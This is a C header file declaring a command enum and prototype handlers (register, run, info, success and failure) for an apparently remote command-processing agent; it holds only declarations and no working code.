#pragma once
#include <stdbool.h>
#include <stdint.h>

#include "agent.h"

typedef enum {
  CMD_FAILURE  = 0,
  CMD_SUCCESS  = 1,
  CMD_REGISTER = 2,
  CMD_KILL     = 3,
  CMD_RUN      = 4,
  CMD_ASK      = 5,
  CMD_INFO     = 6,
  CMD_NONE     = 7,
  CMD_AUTH     = 8,
} cmd_t;

bool cmd_register(agent_t *agent);
bool cmd_handle(agent_t *agent);

// command helpers
bool cmd_success(agent_t *agent, char *data, uint8_t data_size);
bool cmd_failure(agent_t *agent, char *data, uint8_t data_size);

// command handlers
bool cmd_info_handler(agent_t *agent, packet_t *packet);
bool cmd_run_handler(agent_t *agent, packet_t *packet);
